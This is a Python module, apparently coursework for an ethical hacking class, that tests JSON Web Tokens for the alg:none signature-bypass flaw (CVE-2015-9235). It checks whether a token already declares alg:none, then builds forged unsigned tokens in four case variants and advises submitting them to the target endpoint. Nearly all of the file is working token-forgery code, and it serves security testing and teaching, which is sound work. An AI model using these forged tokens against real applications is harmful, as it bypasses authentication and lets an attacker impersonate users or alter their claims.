"""
alg_none.py - alg:none signature bypass attack

tests for the alg:none vulnerability (CVE-2015-9235).

it does two things:
    1. detects if the token already has alg:none set
    2. constructs a modified token with alg:none and no signature
       that can be used to test whether a target accepts it

Author: Patrick Earley
Module: CMP320 Advanced Ethical Hacking
"""

import base64
import json


def _b64url_encode(data):
    # encode a dict or string to base64url without padding
    if isinstance(data, dict):
        data = json.dumps(data, separators=(',', ':')).encode()
    elif isinstance(data, str):
        data = data.encode()
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()


def analyse(decoded):
    """
    test the token for the alg:none vulnerability.

    arg in from decoder.decode(), checking whether the algorithm 
    is already none, then constructs a forged alg:none token 
    regardless. returns list of finding dicts with severity, 
    description, and where relevant a forged_token field.
    """
    findings = []
    header = decoded['header']
    payload = decoded['payload']
    algorithm = decoded['algorithm']

    # build a modified header with alg set to none
    # try all common case variants since some libraries
    # only accept specific casings
    none_variants = ['none', 'None', 'NONE', 'nOnE']
    forged_tokens = []

    for variant in none_variants:
        forged_header = {**header, 'alg': variant}
        forged_header_b64 = _b64url_encode(forged_header)
        payload_b64 = _b64url_encode(payload)

        # alg:none tokens have an empty signature segment
        forged_token = f"{forged_header_b64}.{payload_b64}."
        forged_tokens.append((variant, forged_token))

    # for if already alg:none
    if decoded['is_alg_none']:
        findings.append({
            'severity': 'CRITICAL',
            'title': "token already uses alg:none",
            'description': (
                f"the token header declares alg:none with no signature. "
                f"if a server accepts this token, it is performing no "
                f"signature verification whatsoever. any claims in this "
                f"token could have been forged by an attacker."
            ),
            'forged_token': decoded['raw']
        })
    else:
        # token is properly signed, but we generate forged versions
        # to test whether the target server is vulnerable
        findings.append({
            'severity': 'INFO',
            'title': "token is signed - alg:none forged tokens generated",
            'description': (
                f"the token is signed with {algorithm}. forged alg:none "
                f"variants have been generated below. submit these to the "
                f"target application to test whether it accepts unsigned tokens."
            ),
            'forged_tokens': [
                {'variant': v, 'token': t} for v, t in forged_tokens
            ]
        })

    # flag if the signing input is trivially reproducible
    findings.append({
        'severity': 'INFO',
        'title': "torged alg:none tokens ready",
        'description': (
            f"generated {len(none_variants)} alg:none token variants "
            f"(none, None, NONE, nOnE) to account for case-insensitive "
            f"library implementations. test each against the target endpoint."
        ),
        'forged_tokens': [
            {'variant': v, 'token': t} for v, t in forged_tokens
        ]
    })

    return findings